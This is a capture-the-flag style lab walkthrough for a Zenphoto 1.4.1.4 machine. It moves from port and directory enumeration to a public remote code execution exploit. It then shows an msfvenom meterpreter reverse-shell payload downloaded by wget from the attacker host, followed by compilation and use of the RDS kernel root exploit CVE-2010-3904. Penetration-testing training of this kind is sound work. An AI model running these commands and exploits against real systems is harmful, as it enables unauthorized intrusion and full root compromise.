____

# Exploitation Guide for Zenphoto

## Summary

We will exploit this machine through the **Zenphoto** web application which is vulnerable to a remote code execution exploit. We'll leverage this to gain a reverse shell and raise our privileges to root through a local kernel exploit.

## Enumeration

### Nmap

Let's begin with an `nmap` scan against all TCP ports:

```
kali@kali:~$ sudo nmap -p- 192.168.120.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 11:56 EDT
Nmap scan report for 192.168.120.83
Host is up (0.032s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql
```

Next, we'll run an aggressive scan against the discovered open ports:

```
kali@kali:~$ sudo nmap -A -sV -p 22,23,80,3306 192.168.120.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 11:58 EDT
Nmap scan report for 192.168.120.83
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|terminal|WAP|firewall|switch
Running (JUST GUESSING): Linux 3.X|2.6.X|2.4.X (95%), IGEL embedded (93%), HP embedded (93%), IPFire 2.X (92%), Check Point embedded (90%), Extreme Networks ExtremeXOS 12.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3.2.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:2.6 cpe:/h:igel:ud3 cpe:/h:hp:msm410 cpe:/o:ipfire:ipfire:2.11 cpe:/o:linux:linux_kernel:2.4 cpe:/o:extremenetworks:extremexos:12.5.4
Aggressive OS guesses: Linux 3.2.0 (95%), Linux 2.6.32 (94%), Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.35 (93%), IGEL UD3 thin client (Linux 2.6) (93%), HP MSM410 WAP (93%), IPFire 2.11 firewall (Linux 2.6.32) (92%), DD-WRT v24-sp1 (Linux 2.4) (91%), Linux 2.6.31 - 2.6.32 (91%), Check Point UTM-1 Edge X firewall (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   28.42 ms 192.168.118.1
2   28.57 ms 192.168.120.83
```

### Dirb

Next, we'll bruteforce the website's directories using `dirb` and the common wordlist.

```
kali@kali:~$ dirb http://192.168.120.83

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 24 12:00:22 2020
URL_BASE: http://192.168.120.83/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.120.83/ ----
+ http://192.168.120.83/cgi-bin/ (CODE:403|SIZE:290)                                                             
+ http://192.168.120.83/index (CODE:200|SIZE:75)                                                                 
+ http://192.168.120.83/index.html (CODE:200|SIZE:75)                                                            
+ http://192.168.120.83/server-status (CODE:403|SIZE:295)                                                        
==> DIRECTORY: http://192.168.120.83/test/
```

This reveals an interesting _/test_ directory.

Navigating to [http://192.168.120.83/test/](http://192.168.120.83/test/), we find an instance of Zenphoto:

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_05_image_1_RcNXnrCG.PNG)

Enumerating the version of the software, we find version **1.4.1.4**:

```
kali@kali:~$ curl -s 192.168.120.83/test/ | tail


Powered by <a href=""http://www.zenphoto.org"" title=""A simpler web album""><span id=""zen-part"">zen</span><span id=""photo-part"">PHOTO</span></a></div>


</body>
</html>

<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
<!-- Zenphoto script processing end:0.0715 seconds -->
kali@kali:~$
```

## Exploitation

### Remote Code Execution

This version is vulnerable to a [public exploit](http://www.exploit-db.com/exploits/18083/) which we can use to gain remote code execution on the target:

```
kali@kali:~$ locate 18083.php
...
/usr/share/exploitdb/exploits/php/webapps/18083.php
kali@kali:~$
kali@kali:~$ php /usr/share/exploitdb/exploits/php/webapps/18083.php 192.168.120.83 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

zenphoto-shell#
```

### Reverse Shell

To obtain a reverse shell, we will generate a malicious ELF file, host it with a Python HTTP server, and download it to the target machine.

```
kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=443 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

kali@kali:~$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Using the exploit's shell, we can now download the file and make it executable.

```
zenphoto-shell# wget http://192.168.118.3:8000/shell.elf -P /tmp

zenphoto-shell# chmod +x /tmp/shell.elf

zenphoto-shell#
```

Let's set up the meterpreter handler:

```
kali@kali:~$ msfconsole
...
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.118.3
LHOST => 192.168.118.3
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.118.3:443 
```

Now we're ready to execute our payload:

```
zenphoto-shell# /tmp/shell.elf

[-] Exploit failed!
kali@kali:~$
```

Although it appears that the exploit has failed, the handler indicates that we have received our shell:

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.118.3:443 
[*] Sending stage (985320 bytes) to 192.168.120.83
[*] Meterpreter session 1 opened (192.168.118.3:443 -> 192.168.120.83:50513) at 2020-03-24 12:47:32 -0400

meterpreter > getuid
Server username: uid=33, gid=33, euid=33, egid=33
meterpreter > shell
Process 1877 created.
Channel 1 created.
python -c 'import pty; pty.spawn(""/bin/bash"")'
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$
```

## Escalation

### Local Enumeration

Let's begin local enumeration. First, we'll check the kernel version of this operating system:

```
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ cat /etc/issue
cat /etc/issue
Ubuntu 10.04.3 LTS \n \l

<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ uname -a
uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$
```

Looking up this kernel version, we find that it is vulnerable to a [local privilege escalation exploit](http://www.exploit-db.com/exploits/15285/) in the RDS Protocol.

### Kernel Exploitation

Let's copy the C source code file to our directory.

```
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/15285.c .
kali@kali:~$ head 15285.c
// source: http://www.vsecurity.com/resources/advisory/20101019-1/

/* 
 * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg <drosenberg@vsecurity.com>
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
kali@kali:~$
```

Next, we'll compile this exploit on our attack machine. We may need to install the cross-architecture C header files with the following command:

```
kali@kali:~$ sudo apt-get install gcc-multilib -y
```

We'll compile the exploit as follows:

```
kali@kali:~$ gcc 15285.c -o 15285 -m32
15285.c: In function ‘prep_sock’:
15285.c:66:25: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   66 |  addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
      |                         ^~~~~~~~~
15285.c: In function ‘write_to_mem’:
15285.c:136:3: warning: implicit declaration of function ‘wait’ [-Wimplicit-function-declaration]
  136 |   wait(NULL);
      |   ^~~~
kali@kali:~$
```

Once again, we will start a Python HTTP server to download the privilege escalation exploit to the target machine:

```
kali@kali:~$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...

```

Next, we'll navigate to the _/tmp_ directory on the target and download our exploit.

```
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ cd /tmp
cd /tmp
www-data@offsecsrv:/tmp$ wget http://192.168.118.3:8000/15285
wget http://192.168.118.3:8000/15285
--2020-03-24 13:03:14--  http://192.168.118.3:8000/15285
Connecting to 192.168.118.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7155 (7.0K) [text/plain]
Saving to: `15285'

100%[======================================>] 7,155       --.-K/s   in 0.03s   

2020-03-24 13:03:14 (439 KB/s) - `15285' saved [16740/16740]

www-data@offsecsrv:/tmp$
```

We'll give the exploit executable permissions and run it to obtain root-level privileges on the target system.

```
www-data@offsecsrv:/tmp$ chmod +x /tmp/15285
chmod +x /tmp/15285
www-data@offsecsrv:/tmp$ whoami
whoami
www-data
www-data@offsecsrv:/tmp$ ./15285
./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami
whoami
root
```
